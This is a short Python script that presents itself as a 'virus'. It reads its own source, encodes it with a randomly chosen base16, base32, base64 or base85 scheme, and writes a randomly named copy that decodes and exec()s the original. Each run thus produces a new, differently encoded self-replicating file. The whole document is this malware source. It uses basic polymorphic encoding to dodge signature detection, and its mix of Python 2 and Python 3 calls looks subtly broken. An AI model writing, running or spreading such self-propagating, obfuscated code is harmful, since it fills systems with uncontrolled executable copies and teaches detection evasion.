#!/usr/bin/python
import os, base64, random, string

def random_char(y):
	return ''.join(random.choice(string.ascii_letters) for x in range(y))

def encrypt(lines):
	enc, i = [], random.randint(1,4)
	if i == 1:
		for line in lines:
			enc.append(base64.b16encode(line)+'\n')
	elif i == 2:
		for line in lines:
			enc.append(base64.b32encode(line)+'\n')
	elif i == 3:
		for line in lines:
			enc.append(base64.b64encode(line)+'\n')
	elif i == 4:
		for line in lines:
			enc.append(base64.b85encode(line)+'\n')
	return enc, i

def write_lines(lines, virus):
	with open(virus, 'a') as op:
		op.write('strings = """')
	with open(virus, 'a') as op:
		op.writelines(lines)
	with open(virus, 'a') as op:
		op.write('"""')

def decrypt(lines, opt):
	virus = random_char(random.randint(3,8))
	with open(virus, 'w') as op:
		op.write("#!/usr/bin/python\nimport os, base64\n\noption = "+str(opt)+"\n")
	write_lines(lines, virus)
	with open(virus, 'a') as op:
		op.writelines("""

strings = strings.split(\'\\n\')
code = []
for string in strings:
	if option == 1:
		code.append(base64.b16decode(string))
	elif option == 2:
		code.append(base64.b32decode(string))
	elif option == 3:
		code.append(base64.b64decode(string))
	elif option == 4:
		code.append(base64.b85decode(string))
exec(\'\'.join(code))
\n""")

def main():
	with open(__file__, 'r') as ip:
		lines = []
		for line in ip:
			lines.append(line)
	code, opt = encrypt(lines)
	decrypt(code, opt)

if __name__ == "__main__":
	main()
